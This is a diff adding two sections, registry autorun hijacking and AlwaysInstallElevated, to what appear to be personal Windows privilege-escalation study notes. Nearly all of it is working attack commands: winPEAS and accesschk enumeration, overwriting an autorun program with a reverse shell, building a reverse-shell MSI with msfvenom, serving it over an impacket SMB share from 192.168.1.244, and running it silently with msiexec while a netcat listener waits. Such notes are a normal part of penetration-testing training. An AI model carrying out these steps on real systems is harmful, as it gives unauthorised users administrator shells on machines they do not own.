@@ -196,4 +196,53 @@ PRIVESC DONE
 
                                                                             DLL HIJACKING
                                                                             
+--------------------------------------------------------------------------------------------------------------------------------------------------------------------
+                                                                            Registry exploits
+                                                                            
+run winpeas with the aplications info check:
+winPeasany.exe quiet applicationsinfo
+
+we can also do this manually by querying the registry for autorun programs:
+reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
+
+then we can use accesschk to verify the permissions on the auto run executables:
+accesschk.exe /accepteula -wvu "C:\Program Files\Autorun Program\program.exe"
+
+make sure our user, or our group, or everyone has full access to the file in question*
+
+first make a backup of the original executable:
+copy "C:\Program Files\Autorun Program\program.exe" C:\Temp
+
+then copy our reverse shell executable to overwrite the .exe executable:
+copy /Y reverse.exe "C:\Program Files\Autorun Program\program.exe"
+
+next set up a listner on the attacking machine:
+nc -nlvp 1337
+
+                                                                         AlwaysInstallElevated
+
+run winpeas with the windowscreds check to discover the vulnerability:
+winPEASany.exe quiet windowscreds
+
+to do this manually we can query the registry for the keys:
+reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+
+reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+
+create a new msfvenom shell on the attacking machine:
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=ip LPORT=port -f msi -o /tools/reverse.msi
+
+next set up a listner on the kali machine:
+nc -nlvp 1337
+
+set up an smbserver to transfer the exploit:
+/usr/share/doc/python-impacket/examples/smbserver.py tools .
+
+copy over the reverse shell.
+copy \\192.168.1.244\tools\reverse.msi .
+
+run the reverse shell on the victim machine:
+msiexec /quiet /qn /i reverse.msi
+
+
 
